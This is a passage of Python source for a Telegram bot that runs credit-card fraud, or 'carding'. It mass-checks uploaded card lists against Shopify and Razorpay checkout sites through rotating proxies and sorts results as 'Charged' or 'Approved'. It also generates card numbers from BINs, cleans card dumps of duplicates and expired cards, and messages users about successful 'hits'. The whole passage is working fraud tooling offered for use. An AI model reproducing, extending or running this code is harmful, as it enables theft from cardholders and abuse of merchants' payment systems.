        parse_mode="html"
    )

@bot.on(events.CallbackQuery(data=b"proxy_tools"))
async def proxy_tools_menu(event):
    await event.answer("📡 Proxy Tools!", alert=False)
    proxy_msg = """<b>📡 Proxy Tools</b>
━━━━━━━━━━━━━━━━━━━━
<code>/proxy</code>
➜ Check all proxies from proxy.txt
➜ Remove dead proxies automatically
➜ Get TXT file of working proxies

<code>/addproxy</code>
➜ Add new proxies (Test first)
➜ Supports: ip:port, socks5, http

<code>/getproxy</code>
➜ View all saved proxies

<code>/rmproxy ip:port</code>
➜ Remove specific proxy

<code>/clearproxy</code>
➜ Clear all + Auto backup TXT"""

    await event.edit(
        premium_emoji(proxy_msg),
        buttons=[[Button.inline("🔙 𝘽𝘼𝘾𝙆", b"tools_menu")]],
        parse_mode="html"
    )

@bot.on(events.CallbackQuery(data=b"cc_tools"))
async def cc_tools_menu(event):
    await event.answer("💳 CC Tools!", alert=False)
    cc_msg = """<b>💳 UNLIMITED CC GENERATOR & TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/gen BIN [BIN2 ...] [COUNT]</code>
➜ Generate unlimited CC from single or multiple BINs
➜ Example: <code>/gen 601100 50000</code>

<code>/scrape</code>
➜ Reply to .txt CC file
➜ Removes duplicates & expired cards
➜ Get clean TXT file"""

    await event.edit(
        premium_emoji(cc_msg),
        buttons=[[Button.inline("🔙 𝘽𝘼𝘾𝙆", b"tools_menu")]],
        parse_mode="html"
    )

def get_indian_time():
    ist = pytz.timezone('Asia/Kolkata')
    now = datetime.now(ist)
    return now.strftime("%I:%M:%S %p IST")

@bot.on(events.CallbackQuery(pattern=b"copycc_"))
async def copy_cc_handler(event):
    try:
        data = event.data.decode('utf-8')
        cc = data.split("_", 1)[1]
        await event.answer(f"✅ CC Copied!\n\n{cc}", alert=True)
    except Exception as e:
        print(f"Copy error: {e}")
        await event.answer("❌ Copy failed", alert=True)

@bot.on(events.NewMessage(pattern=r'^/cc(?:\s|$)'))
async def single_cc_check(event):
    user_id = event.sender_id
    save_user(user_id)

    if len(event.message.text.strip()) <= 4:
        await event.reply("Usage: `/cc 5209430225796165|01|27|458`")
        return

    try:
        sender = await event.get_sender()
        first_name = sender.first_name if sender.first_name else "User"
    except:
        first_name = "User"

    user_sites = get_user_sites_sync(user_id)
    global_sites = load_sites()

    if user_sites:
        sites = user_sites
        site_source = "YOUR SITES"
    elif global_sites:
        sites = global_sites
        site_source = "BOT SITES"
    else:
        await event.reply(premium_emoji("""❌ **No sites available!**

📌 **Add your sites first:**
<code>/addsites https://yoursite.com</code>

💡 **Or check bot sites:**
<code>/site</code>"""), parse_mode="html")
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available! Use /addproxy."))
        return

    text = event.message.text or ""
    parts = text.split(' ', 1)
    if len(parts) < 2:
        await event.reply("❌ Data missing")
        return

    cc_input = parts[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: card|mm|yyyy|cvv"))
        return

    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"<b>⚡ Checking with {site_source}...</b>"), parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=8)

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        gateway = result.get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = result.get("price", "-")
        response_msg = str(result.get('message', 'Unknown Response'))[:60]

        if result.get('status') == 'Site Error' and result.get('site') and is_admin(user_id):
            current_sites = load_sites()
            if result['site'] in current_sites:
                new_sites = [s for s in current_sites if s != result['site']]
                async with aiofiles.open(SITES_FILE, 'w') as f:
                    for site in new_sites:
                        await f.write(f"{site}\n")
                await bot.send_message(user_id, f"🗑️ Dead site auto-removed: `{result['site'][:50]}`")

        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            top_line = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
        elif result['status'] == 'Approved':
            status_emoji = "✅"
            status_text = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            top_line = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        else:
            status_emoji = "❌"
            status_text = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 😂"
            top_line = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"

        current_time = get_indian_time()
        is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
        currency = "₹" if is_razorpay else "💵"

        final_resp = f"""{top_line}        
━━━━━━━━━━━━━━━━━━━
⭐ 𝐆𝐚𝐭𝐞 ➜ {gateway}
✔️ 𝐂𝐂 ➜ <tg-spoiler><code>{result['card']}</code></tg-spoiler>
⚡️𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_emoji} {status_text}
⭐ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_msg}
{currency} 𝐀𝐦𝐨𝐮𝐧𝐭 ➜ {currency}{price}
💳 𝐁𝐢𝐧 ➜ {card[:6]} - {brand}
🏧 𝐁𝐚𝐧𝐤 ➜ {bank}
☄️ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} {flag}
⏳ 𝐓𝐢𝐦𝐞 ➜ {current_time}
👑 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ <a href="tg://user?id={user_id}">{first_name}</a>"""

        cc_copy = result['card']
        buttons = [
            [Button.inline("𝘾𝙊𝙋𝙔 𝘾𝘾", f"copycc_{cc_copy}".encode())]
        ]

        try:
            await status_msg.delete()
        except:
            pass

        await send_to_chat(event.chat_id, premium_emoji(final_resp), buttons=buttons, parse_mode="html")

        if result['status'] in ['Charged', 'Approved']:
            await send_realtime_hit_dm(user_id, result, result['status'], first_name)
    except Exception as e:
        try:
            await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:80]}"), parse_mode='html')
        except:
            await event.reply(premium_emoji(f"❌ Error: {str(e)[:80]}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply("proxy.txt is already empty.")
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file = f"proxy_backup_{user_id}_{timestamp}.txt"

    async with aiofiles.open(backup_file, 'w') as f:
        for proxy in current_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(f"🤩Backup Created! {count} proxies saved.", file=backup_file)
    try:
        os.remove(backup_file)
    except:
        pass

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(f"""✅ All Proxies Cleared!

🗑 Cleared: {count} proxies
📦 Backup: Sent above
📊 proxy.txt: Empty now

💡 Use /addproxy to add new proxies.""")

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admins can use this command."))
        return

    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"))
            return

        url_to_remove = args[1].strip()
        current_sites = load_sites()
        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f" Site not found in list: `{url_to_remove}`"))
            return

        new_sites = [site for site in current_sites if site != url_to_remove]
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f" **Site Removed Successfully!**\n\n`{url_to_remove}` has been deleted from `sites.txt`."))
    except Exception as e:
        await event.reply(premium_emoji(f" Error removing site: {e}"))

# ==================== UNLIMITED CC GENERATOR ====================
@bot.on(events.NewMessage(pattern=r'^/gen\s+(.+)'))
async def gen_cc_command(event):
    user_id = event.sender_id
    start_ts = time.time()

    try:
        sender = await event.get_sender()
        username = sender.username or sender.first_name or f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    args = event.pattern_match.group(1).strip().split()
    if not args:
        await event.reply("Usage: /gen 601100 534109 50000")
        return

    bins = []
    total_cards = 50000

    for arg in args:
        if arg.isdigit():
            if len(arg) <= 6:
                bins.append(arg)
            else:
                total_cards = max(1, int(arg))

    if not bins:
        await event.reply("❌ Valid BIN ivvandi.\nExample: /gen 601100 534109 50000")
        return

    per_bin = max(1, total_cards // len(bins))
    all_cards = []
    for binp in bins:
        all_cards.extend(generate_cc(binp, per_bin))

    random.shuffle(all_cards)
    all_cards = all_cards[:total_cards]

    if all_cards:
        brand, bin_type, _, bank, country, flag = await get_bin_info(all_cards[0].split('|')[0])
    else:
        brand = bin_type = bank = country = flag = '-'

    elapsed = round(time.time() - start_ts, 2)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"Generated_CC_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        for card in all_cards:
            await f.write(f"{card}\n")

    summary = f"""✅ <b>Unlimited CC Generated</b>
━━━━━━━━━━━━━━━━━━━━
🔢 <b>BINs:</b> <code>{', '.join(bins)}</code>
💳 <b>Total Cards:</b> <code>{len(all_cards)}</code>
🏷️ <b>Brand:</b> {brand} - {bin_type}
🏦 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} {flag}
⏱️ <b>Time:</b> {elapsed}s
👤 <b>By:</b> <a href="tg://user?id={user_id}">{username}</a> [♾️ Unlimited]"""

    await event.reply(premium_emoji(summary), file=filename, parse_mode="html")
    try:
        os.remove(filename)
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/scrape'))
async def pure_scrape(event):
    user_id = event.sender_id

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📄 Reply to CC .txt file with /scrape"))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("❌ Sirf .txt file reply kar."))
        return

    status = await event.reply(premium_emoji("<b>⚡ Pure CC Scraper Running...</b>"))

    try:
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()

        raw_cards = extract_cc(content)
        total_found = len(raw_cards)
        unique_cards = list(dict.fromkeys(raw_cards))
        duplicates_removed = total_found - len(unique_cards)

        valid_cards = []
        expired = 0
        for card in unique_cards:
            try:
                _, month, year, _ = card.split('|')
                y = int(year) if len(year) == 4 else 2000 + int(year)
                if y < 2026 or (y == 2026 and int(month) < 8):
                    expired += 1
                else:
                    valid_cards.append(card)
            except:
                valid_cards.append(card)

        summary = f"""<b>✅ 𝗦𝗖𝗥𝗔𝗣𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>
━━━━━━━━━━━━━━━━━━━━
<blockquote>
📊 𝗧𝗼𝘁𝗮𝗹 𝗙𝗼𝘂𝗻𝗱 : <code>{total_found}</code>
🗑 𝗗𝘂𝗽𝗹𝗶𝗰𝗮𝘁𝗲𝘀 : <code>{duplicates_removed}</code>
⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 : <code>{expired}</code>
✅ 𝗩𝗮𝗹𝗶𝗱 𝗖𝗖 : <code>{len(valid_cards)}</code>
</blockquote>"""

        await status.edit(premium_emoji(summary), parse_mode="html")

        if not valid_cards:
            await status.edit(premium_emoji("❌ No valid CC after cleaning."))
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        clean_file = f"Cleaned_CC_{user_id}_{timestamp}.txt"

        async with aiofiles.open(clean_file, 'w') as f:
            for card in valid_cards:
                await f.write(f"{card}\n")

        await bot.send_message(
            user_id,
            premium_emoji(f"""<b>📄 𝗖𝗟𝗘𝗔𝗡 𝗙𝗜𝗟𝗘 𝗥𝗘𝗔𝗗𝗬</b>
<blockquote>
💎 𝗩𝗮𝗹𝗶𝗱 𝗖𝗖 : <code>{len(valid_cards)}</code>
📁 𝗙𝗶𝗹𝗲 : <code>{clean_file}</code>
</blockquote>"""),
            file=clean_file,
            parse_mode="html"
        )

        try:
            os.remove(clean_file)
        except:
            pass
    except Exception as e:
        await status.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"))
    finally:
        if 'file_path' in locals() and os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    save_user(user_id)

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not event.reply_to_msg_id:
        await event.reply("❌ Reply to .txt file.")
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg or not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply("❌ Sirf .txt file reply kar.")
        return

    user_sites = get_user_sites_sync(user_id)
    global_sites = load_sites()
    proxies = load_proxies()

    if not proxies:
        await event.reply("❌ No proxies available!")
        return

    if not user_sites and not global_sites:
        await event.reply("❌ No sites available!")
        return

    status_msg = await event.reply("🔄 Loading...")

    await status_msg.edit(
        f"""<b>🔄 Select Sites Source</b>

🟢 <b>Your Sites:</b> <code>{len(user_sites)}</code> 
🔵 <b>Bot Sites:</b> <code>{len(global_sites)}</code>

<b>👇 Choose which sites to use:</b>""",
        buttons=[
            [
                Button.inline(f"🟢 MY SITES ({len(user_sites)})", f"chk_my_{status_msg.id}".encode()),
                Button.inline(f"🔵 BOT SITES ({len(global_sites)})", f"chk_global_{status_msg.id}".encode()),
            ],
            [
                Button.inline("❌ CANCEL", f"cancel_chk_{status_msg.id}".encode()),
            ]
        ],
        parse_mode="html"
    )

    active_sessions[f"chk_{user_id}_{status_msg.id}"] = {
        'user_id': user_id,
        'username': username,
        'is_admin': is_admin(user_id),
        'reply_msg': reply_msg,
        'status_msg_id': status_msg.id,
        'user_sites': user_sites,
        'global_sites': global_sites,
        'proxies': proxies
    }

@bot.on(events.CallbackQuery(pattern=rb"chk_my_(\d+)"))
async def chk_my_sites_handler(event):
    user_id = event.sender_id
    msg_id = int(event.pattern_match.group(1).decode())
    session_key = f"chk_{user_id}_{msg_id}"

    if session_key not in active_sessions:
        await event.answer("❌ Session expired! Use /chk again.", alert=True)
        return

    data = active_sessions[session_key]
    sites = data['user_sites']
    if not sites:
        await event.answer("❌ Aapne koi site add nahi ki!\nUse /addsites url pehle.", alert=True)
        return

    await event.answer(f"✅ Using YOUR {len(sites)} sites!", alert=True)
    try:
        await event.delete()
    except:
        pass
    asyncio.create_task(run_chk(data, sites))

@bot.on(events.CallbackQuery(pattern=rb"chk_global_(\d+)"))
async def chk_global_sites_handler(event):
    user_id = event.sender_id
    msg_id = int(event.pattern_match.group(1).decode())
    session_key = f"chk_{user_id}_{msg_id}"

    if session_key not in active_sessions:
        await event.answer("❌ Session expired! Use /chk again.", alert=True)
        return

    data = active_sessions[session_key]
    sites = data['global_sites']
    if not sites:
        await event.answer("❌ Bot sites bhi nahi hain!", alert=True)
        return

    await event.answer(f"✅ Using BOT {len(sites)} sites!", alert=True)
    try:
        await event.delete()
    except:
        pass
    asyncio.create_task(run_chk(data, sites))

@bot.on(events.CallbackQuery(pattern=rb"cancel_chk_(\d+)"))
async def cancel_chk_handler(event):
    msg_id = int(event.pattern_match.group(1).decode())
    await event.answer("❌ Cancelled!", alert=True)
    try:
        await event.delete()
    except:
        pass
    for key in list(active_sessions.keys()):
        if str(msg_id) in key:
            del active_sessions[key]

async def run_chk(data, sites):
    user_id = data['user_id']
    username = data['username']
    is_admin_user = data['is_admin']
    reply_msg = data['reply_msg']
    proxies = data['proxies']

    status_msg = await bot.send_message(user_id, "🫆 Processing file...")

    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)

    if not cards:
        await status_msg.edit("❌ No valid cards found.")
        try:
            os.remove(file_path)
        except:
            pass
        return

    try:
        os.remove(file_path)
    except:
        pass

    total_cards = len(cards)
    await status_msg.edit(f"🫆 Starting check for {total_cards} cards...")

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [], 'approved': [], 'dead': [], 'error_cards': [],
        'errors': 0, 'total': total_cards, 'checked': 0, 'start_time': time.time()
    }

    dead_sites_to_remove = set()

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update_time = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(0.3)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                try:
                    card = await asyncio.wait_for(queue.get(), timeout=0.5)
                except:
                    continue

                max_retries = 5
                for attempt in range(max_retries):
                    try:
                        res = await check_card_with_retry(card, sites, proxies, max_retries=8)
                        break
                    except Exception as e:
                        if "timeout" in str(e).lower() or "connection" in str(e).lower():
                            if attempt < max_retries - 1:
                                await asyncio.sleep(2)
                                continue
                            res = {
                                'status': 'Site Error',
                                'message': f'API Failed after retries: {str(e)[:80]}',
                                'card': card,
                                'site': None,
                                'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
                                'price': '-',
                                'retry': False
                            }
                        else:
                            res = {
                                'status': 'Site Error',
                                'message': f'Error: {str(e)[:80]}',
                                'card': card,
                                'site': None,
                                'gateway': '𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮',
                                'price': '-',
                                'retry': False
                            }

                if res.get('site') and res.get('status') == 'Site Error':
                    dead_sites_to_remove.add(res['site'])

                if res.get('site') and any(x in str(res.get('message', '')).lower() for x in [
                    'request timeout', 'merchandise_expected_price_mismatch',
                    'payments_credit_card_generic', 'failed to get session token',
                    'error', 'invalid json', '429', '403', '503', 'no valid',
                    'site dead', 'cloudflare', 'timeout', 'connection'
                ]):
                    dead_sites_to_remove.add(res['site'])

                all_results['checked'] += 1

                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    asyncio.create_task(send_realtime_hit_dm(user_id, res, 'Charged', username))
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    asyncio.create_task(send_realtime_hit_dm(user_id, res, 'Approved', username))
                elif any(x in str(res.get('message', '')).lower() for x in ['error', 'invalid json', '429', '403', '503', 'no valid']):
                    all_results['errors'] += 1
                    all_results['error_cards'].append(res)
                else:
                    all_results['dead'].append(res)

                queue.task_done()
                now = time.time()
                if all_results['checked'] % 15 == 0 or all_results['checked'] == total_cards:
                    if now - last_update_time[0] >= 1.5:
                        last_update_time[0] = now
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'], first_name=username)
                        except:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(20)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'], first_name=username)
    except Exception as e:
        await bot.send_message(user_id, f"❌ Error: {str(e)[:100]}")
    finally:
        if dead_sites_to_remove and is_admin_user:
            current_sites = load_sites()
            new_sites = [s for s in current_sites if s not in dead_sites_to_remove]
            if len(new_sites) != len(current_sites):
                async with aiofiles.open(SITES_FILE, 'w') as f:
                    for site in new_sites:
                        await f.write(f"{site}\n")
                await bot.send_message(
                    user_id,
                    f"🗑️ {len(current_sites) - len(new_sites)} dead sites auto-removed from sites.txt!\n\n" +
                    "\n".join(list(dead_sites_to_remove)[:10])
                )

        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, all_results)

# ==================== NOTICE SYSTEM ====================
def save_user(user_id):
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("""CREATE TABLE IF NOT EXISTS users 
                         (user_id INTEGER PRIMARY KEY)""")
        cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/Notice(?:\s|$)(.*)'))
async def notice_to_all(event):
    if not is_admin(event.sender_id):
        return

    notice_text = event.pattern_match.group(1).strip()
    if not notice_text:
        await event.reply("⚠️ Notice message do!\n\nExample: /Notice Bot update aaya hai")
        return

    users = []
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        rows = cursor.fetchall()
        for row in rows:
            users.append(row[0])
        conn.close()
    except Exception as e:
        await event.reply(f"❌ Database error: {e}")
        return

    if not users:
        await event.reply("❌ Koi user nahi hai! Pehle users /start karenge.")
        return

    notice_msg = f"""📢 NOTICE FROM ADMIN

{notice_text}"""

    status = await event.reply(f"📤 Notice bhej raha hu {len(users)} users ko...")

    sent = 0
    failed = 0

    for user_id in users:
        try:
            await bot.send_message(user_id, notice_msg, parse_mode='markdown')
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1

    await status.edit(f"""✅ Notice Sent!

📤 Success: {sent}
❌ Failed: {failed}
👥 Total: {len(users)}""")

def get_all_users():
    users = set()
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        rows = cursor.fetchall()
        for row in rows:
            users.add(row[0])
        conn.close()
    except:
        pass

    try:
        with open('users.json', 'r') as f:
            data = json.load(f)
            if isinstance(data, list):
                for uid in data:
                    users.add(int(uid) if isinstance(uid, str) else uid)
    except:
        pass

    return list(users)

async def send_realtime_hit_dm(user_id, result, hit_type, username):
    try:
        if result["status"] not in ("Approved", "Charged"):
            return

        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = result.get("price", "-")
        is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()

        response_msg = str(result.get('message', 'Unknown Response'))[:150]
        card = result.get('card', '')
        currency = "₹" if is_razorpay else "💵"
        current_time = datetime.now().strftime("%H:%M:%S IST")

        if result['status'] == 'Charged':
            status_emoji = "✅"
            status_text = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
        else:
            status_emoji = "🔥"
            status_text = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"

        if is_razorpay:
            message = f"""<b>⚡💳 𝐑𝐀𝐙𝐎𝐑𝐏𝐀𝐘 𝐇𝐈𝐓 💳⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>✔️ 𝐂𝐂 ➜ </b><tg-spoiler><code>{result['card']}</code></tg-spoiler>
<b>⚡️𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_emoji} {status_text}</b>
<b>⭐ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_msg}</b>
━━━━━━━━━━━━━━━━━━━━
<b>{currency} 𝐀𝐦𝐨𝐮𝐧𝐭 ➜ {currency}{price}</b>
<b>💳 𝐁𝐢𝐧 ➜ {card[:6]} - {brand}</b>
<b>🏧 𝐁𝐚𝐧𝐤 ➜ {bank}</b>
<b>☄️ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} {flag}</b>
<b>⏳ 𝐓𝐢𝐦𝐞 ➜ {current_time}</b>
<b>👑 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ <a href="tg://user?id={user_id}">{username}</a></b>"""
        else:
            message = f"""<b>⚡💳 𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 💳⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>✔️ 𝐂𝐂 ➜ </b><tg-spoiler><code>{result['card']}</code></tg-spoiler>
<b>⚡️𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_emoji} {status_text}</b>
<b>⭐ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_msg}</b>
━━━━━━━━━━━━━━━━━━━━
<b>{currency} 𝐀𝐦𝐨𝐮𝐧𝐭 ➜ {currency}{price}</b>
<b>💳 𝐁𝐢𝐧 ➜ {card[:6]} - {brand}</b>
<b>🏧 𝐁𝐚𝐧𝐤 ➜ {bank}</b>
<b>☄️ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} {flag}</b>
<b>⏳ 𝐓𝐢𝐦𝐞 ➜ {current_time}</b>
<b>👑 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ <a href="tg://user?id={user_id}">{username}</a></b>"""

        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except Exception as e:
        print(f"DM hit error: {e}")

# ==================== CC GENERATOR ====================
def generate_cc(bin_prefix, count=10):
    cards = []
    for _ in range(count):
        remaining = 16 - len(bin_prefix)
        card_num = bin_prefix + ''.join(str(random.randint(0, 9)) for _ in range(remaining))
        month = random.randint(1, 12)
        year = random.randint(2026, 2030)
        cvv = random.randint(100, 999)
        cc = f"{card_num[:16]}|{month:02d}|{year}|{cvv}"
        cards.append(cc)
    return cards

async def send_filtered_results(user_id, results, filter_type):
    last_button_click = {}
    now = time.time()

    if user_id in last_button_click and now - last_button_click[user_id] < 30:
        remaining = int(30 - (now - last_button_click[user_id]))
        await bot.send_message(user_id, f"⏳ {remaining} seconds wait karo bhai, spam mat karo!")
        return
    last_button_click[user_id] = now

    filtered = []
    if filter_type == "charged":
        filtered = results.get('charged', [])
        title = "CHARGED_HITS"
        emoji = "💎"
    elif filter_type == "live":
        filtered = results.get('approved', [])
        title = "LIVE_APPROVED_HITS"
        emoji = "🔥"
    elif filter_type == "dead":
        filtered = results.get('dead', [])
        title = "DEAD_HITS"
        emoji = "❌"
    else:
        filtered = results.get('charged', []) + results.get('approved', []) + results.get('dead', [])
        title = "ALL_HITS"
        emoji = "📊"

    if not filtered:
        await bot.send_message(user_id, f"❌ No {title} found.")
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{title}_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(f"⚡ {title} - 𝙎𝙝𝙤𝙥𝙞𝙞 𝙓 𝙍𝙯𝙧 ⚡\n")
        await f.write(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S IST')}\n")
        await f.write("=" * 60 + "\n\n")

        for r in filtered:
            card = r.get('card', 'N/A')
            parts = card.split('|') if '|' in card else ['N/A']
            bin_num = parts[0][:6] if len(parts[0]) >= 6 else 'N/A'
            gateway = r.get('gateway', 'Unknown')
            price = r.get('price', '-')
            message = str(r.get('message', 'Unknown'))[:150]
            status = r.get('status', 'Dead')
            is_rz = "razorpay" in gateway.lower() or "rz" in gateway.lower()

            if status == 'Charged':
                s_emoji = "✅"
                s_text = "CHARGED 💎"
            elif status == 'Approved':
                s_emoji = "🔥"
                s_text = "APPROVED ✅"
            else:
                s_emoji = "❌"
                s_text = "DECLINED 😂"

            if is_rz:
                title_gate = "⚡💳 𝐑𝐀𝐙𝐎𝐑𝐏𝐀𝐘 𝐇𝐈𝐓 💳⚡"
                currency = "₹"
            else:
                title_gate = "⭐ 𝐆𝐚𝐭𝐞 ➜ 𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮"
                currency = "💵"

            await f.write(f"""{title_gate}
━━━━━━━━━━━━━━━━━━━━
✔️ 𝐂𝐂 ➜ {card}
